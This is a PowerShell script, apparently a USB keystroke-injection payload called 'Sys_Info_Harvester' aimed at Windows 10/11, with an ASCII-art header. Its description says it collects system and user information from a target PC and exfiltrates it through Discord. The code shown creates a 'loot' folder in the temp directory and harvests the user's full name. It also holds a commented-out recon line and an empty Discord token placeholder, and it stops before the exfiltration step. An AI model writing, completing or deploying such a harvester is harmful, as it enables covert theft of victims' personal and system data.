######################################################################################################################################################################
#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
# -Title     :Sys_Info_Harvester              |                                                                   |            / ##### \       : ||            ''.   #
# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
#                                             |                                                                   |         |   |     |  '...''  ||                  #
#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
#                                                                                                                 |          \ |       |         ||                  # 
#                                                                                                                 |          |\|       |         ||                  #
#                                                                                                                 |          \|         |        ||                  #
#                                                                                                                 |           |         |        ||                  #
#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
#                                                                                                                 |        __|           |__     ||                  #
#                                                                                                                 |       /   '.........'   \    ||                  #
#                                                                                                                 |        ''''''     ''''''     ##                  #
######################################################################################################################################################################                                                                                                                              

<#
.DESCRIPTION
        This program gathers system and user information from target Windows PC. Gathered information is formated and output to a file. That file is then exfiltrated
        to cloud storage via Discord. This program was influenced by various other programs and research.
#>

######################################################################################################################################################################

# Create loot folder, file, and zip

$FolderName = "$env:USERNAME-$(get-date -f 'M/d/yyyy h:mmtt')_harvester"

$FileName = "$FolderName.txt"

$ZipFile = "$FolderName.zip"

New-Item -Path $env:tmp/$FolderName -ItemType Directory

######################################################################################################################################################################

#Discord access token (not needed in ps1?)

#$dc = ""

######################################################################################################################################################################

# Recon all user directories (needs work /a=parsing? /f=full directory?)

#tree $env:USERPROFILE /a /f >> $env:TEMP\$FolderName\FileTree.txt

######################################################################################################################################################################

function Get-fullName {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    if($fullName -gt $null) {

    return $fullName
 
 }else{
    Write-Host("No full name available for...$env:UserName")
    } 

}

$fullName = Get-fullName

######################################################################################################################################################################
